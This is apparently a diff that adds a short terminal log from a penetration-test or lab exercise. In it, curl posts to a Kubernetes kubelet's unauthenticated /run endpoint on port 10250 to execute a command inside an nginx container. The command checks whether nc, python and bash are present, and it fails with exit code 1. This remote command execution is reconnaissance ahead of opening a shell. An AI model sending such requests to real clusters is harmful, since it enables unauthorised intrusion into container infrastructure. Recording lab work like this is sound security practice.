@@ -1,0 +1,10 @@
+### [2026-04-05 10:25:09] curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=which nc python python3 bash
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=which nc python python3 bash
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100     86 100     54 100     32    308    182                              0100     86 100     54 100     32    308    182                              0100     86 100     54 100     32    308    182                              0
+command 'which nc python python3 bash' exited with 1: 
+# Exit code: 0
+# Duration: 2026-04-05 10:25:10
